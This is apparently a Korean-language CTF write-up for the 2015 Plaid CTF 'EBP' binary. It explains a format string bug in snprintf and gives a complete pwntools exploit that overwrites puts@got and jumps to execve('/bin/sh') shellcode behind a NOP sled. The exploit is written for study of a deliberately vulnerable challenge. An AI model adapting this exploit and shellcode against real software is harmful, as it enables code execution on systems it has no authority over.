---
title: "2015 Plaid CTF EBP"
date: 2020-1-27
tags: [Plaid]
categories: [Plaid]
---

32비트 바이너리고 Partial RELRO밖에 안 걸려있다.

```
[*] '/vagrant/ctfs/ebp'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

메인에서 전역변수 buf에 입력받는다. 근데 snprintf가 사용되는데 buf에 포맷스트링 있으면 포맷스트링 버그를 일으킬 수 있다. 일단 전역변수로 입력받으니까 Double Staged Format String Bug로 익스해야할거다.

```c
int echo()
{
  make_response();
  puts(response);
  return fflush(stdout);
}

int make_response()
{
  return snprintf(response, 1024u, buf);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax

  while ( 1 )
  {
    result = fgets(buf, 1024, stdin);
    if ( !result )
      break;
    echo();
  }
  return result;
}
```

snprintf 실행하기 전에 스택을 보면 이렇게 되어있다. 

```
pwndbg> x/50wx $esp
0xffffd350:	0x0804a480	0x00000400	0x0804a080	0xf7fd51b0
0xffffd360:	0xf7fe77eb	0x00000000	0xffffd388	0x0804852c
0xffffd370:	0xffffd3a8	0xf7fee010	0xf7e6915b	0x00000000
0xffffd380:	0xf7fbd000	0xf7fbd000	0xffffd3a8	0x08048557
0xffffd390:	0x0804a080	0x00000400	0xf7fbd5a0	0x00000000
0xffffd3a0:	0xf7fbd000	0xf7fbd000	0x00000000	0xf7e23637
0xffffd3b0:	0x00000001	0xffffd444	0xffffd44c	0x00000000
0xffffd3c0:	0x00000000	0x00000000	0xf7fbd000	0xf7ffdc04
0xffffd3d0:	0xf7ffd000	0x00000000	0xf7fbd000	0xf7fbd000
0xffffd3e0:	0x00000000	0xaf9aa8a5	0x945626b5	0x00000000
0xffffd3f0:	0x00000000	0x00000000	0x00000001	0x08048400
0xffffd400:	0x00000000	0xf7fee010	0xf7fe8880	0xf7ffd000
```

0x0804a480는 response의 주소 0x0804a080는 buf의 주소다. 

익스는 0xffffd368을 보면 0xffffd388를 가르키고 있는 포인터다. 일단 0xffffd368를 puts@got로 덮으면 0xffffd388이 덮일거다. 그리고 puts@got주소를 buf+100으로 덮고 nop sled뒤에 shellcode 넣으면 puts실행될 때 쉘코드가 실행될거다.

> exploit.py

```python
from pwn import *

e = ELF('./ebp')
p = process('./ebp')

#shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
shellcode = '\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80'
fflush_got = 0x0804a00c
fgets_got = 0x0804a010
puts_got = 0x0804a014
snprintf_got = 0x0804a020
buf = 0x0804A080

#payload = '%{}c%n'.format('134520852')
payload = "%{}c%4$n".format(e.got['puts'])
p.sendline(payload)

payload2 = '%{}c%12$n'.format(buf+100)
payload2 += '\x90'*300
payload2 += shellcode
p.sendline(payload2)

p.interactive()
```

